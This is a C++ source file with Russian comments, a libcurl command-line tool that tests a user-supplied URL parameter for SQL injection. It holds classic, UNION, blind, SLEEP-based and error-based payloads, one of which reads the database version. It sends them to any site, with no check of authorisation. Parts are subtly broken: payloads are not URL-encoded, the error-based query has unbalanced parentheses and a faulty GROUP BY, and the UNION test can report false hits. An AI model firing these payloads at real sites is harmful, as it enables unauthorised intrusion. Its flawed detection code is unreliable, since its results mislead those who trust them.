#include <iostream>
#include <string>
#include <curl/curl.h>
#include <vector>
#include <thread>
#include <chrono>

// Функция для обработки ответа от сервера
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
    size_t newLength = size * nmemb;
    try {
        s->append((char*)contents, newLength);
    } catch (std::bad_alloc& e) {
        return 0;
    }
    return newLength;
}

// Функция для отправки HTTP-запроса
std::string sendRequest(const std::string& url) {
    CURL* curl;
    CURLcode res;
    std::string response;

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "Ошибка при выполнении запроса: " << curl_easy_strerror(res) << std::endl;
        }
        curl_easy_cleanup(curl);
    }
    return response;
}

// Функция для проверки классической SQL-инъекции
bool checkClassicInjection(const std::string& url, const std::string& param) {
    std::string testUrl = url + "?" + param + "=1' OR '1'='1";
    std::string response = sendRequest(testUrl);

    if (response.find("SQL syntax") != std::string::npos ||
        response.find("error in your SQL syntax") != std::string::npos) {
        return true;
    }
    return false;
}

// Функция для проверки Union-based SQL-инъекции
bool checkUnionInjection(const std::string& url, const std::string& param) {
    std::string testUrl = url + "?" + param + "=1' UNION SELECT null, null, null --";
    std::string response = sendRequest(testUrl);

    if (response.find("UNION") != std::string::npos ||
        response.find("error in your SQL syntax") != std::string::npos) {
        return true;
    }
    return false;
}

// Функция для проверки Blind SQL-инъекции
bool checkBlindInjection(const std::string& url, const std::string& param) {
    std::string trueUrl = url + "?" + param + "=1' AND 1=1 --";
    std::string falseUrl = url + "?" + param + "=1' AND 1=2 --";

    std::string trueResponse = sendRequest(trueUrl);
    std::string falseResponse = sendRequest(falseUrl);

    // Сравниваем ответы
    if (trueResponse != falseResponse) {
        return true;
    }
    return false;
}

// Функция для проверки Time-based SQL-инъекции
bool checkTimeBasedInjection(const std::string& url, const std::string& param) {
    std::string testUrl = url + "?" + param + "=1' AND SLEEP(5) --";

    auto start = std::chrono::high_resolution_clock::now();
    sendRequest(testUrl);
    auto end = std::chrono::high_resolution_clock::now();

    std::chrono::duration<double> elapsed = end - start;

    // Если время ответа больше 5 секунд, возможно, есть уязвимость
    if (elapsed.count() >= 5) {
        return true;
    }
    return false;
}

// Функция для проверки Error-based SQL-инъекции
bool checkErrorBasedInjection(const std::string& url, const std::string& param) {
    std::string testUrl = url + "?" + param + "=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT @@version), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x.y) --";
    std::string response = sendRequest(testUrl);

    if (response.find("Duplicate entry") != std::string::npos ||
        response.find("error in your SQL syntax") != std::string::npos) {
        return true;
    }
    return false;
}

int main() {
    std::string url;
    std::string param;

    std::cout << "Введите URL для проверки: ";
    std::cin >> url;
    std::cout << "Введите параметр для тестирования: ";
    std::cin >> param;

    std::cout << "\nПроверка классической SQL-инъекции..." << std::endl;
    if (checkClassicInjection(url, param)) {
        std::cout << "[+] Уязвимость к классической SQL-инъекции обнаружена!" << std::endl;
    } else {
        std::cout << "[-] Уязвимость к классической SQL-инъекции не обнаружена." << std::endl;
    }

    std::cout << "\nПроверка Union-based SQL-инъекции..." << std::endl;
    if (checkUnionInjection(url, param)) {
        std::cout << "[+] Уязвимость к Union-based SQL-инъекции обнаружена!" << std::endl;
    } else {
        std::cout << "[-] Уязвимость к Union-based SQL-инъекции не обнаружена." << std::endl;
    }

    std::cout << "\nПроверка Blind SQL-инъекции..." << std::endl;
    if (checkBlindInjection(url, param)) {
        std::cout << "[+] Уязвимость к Blind SQL-инъекции обнаружена!" << std::endl;
    } else {
        std::cout << "[-] Уязвимость к Blind SQL-инъекции не обнаружена." << std::endl;
    }

    std::cout << "\nПроверка Time-based SQL-инъекции..." << std::endl;
    if (checkTimeBasedInjection(url, param)) {
        std::cout << "[+] Уязвимость к Time-based SQL-инъекции обнаружена!" << std::endl;
    } else {
        std::cout << "[-] Уязвимость к Time-based SQL-инъекции не обнаружена." << std::endl;
    }

    std::cout << "\nПроверка Error-based SQL-инъекции..." << std::endl;
    if (checkErrorBasedInjection(url, param)) {
        std::cout << "[+] Уязвимость к Error-based SQL-инъекции обнаружена!" << std::endl;
    } else {
        std::cout << "[-] Уязвимость к Error-based SQL-инъекции не обнаружена." << std::endl;
    }

    return 0;
}
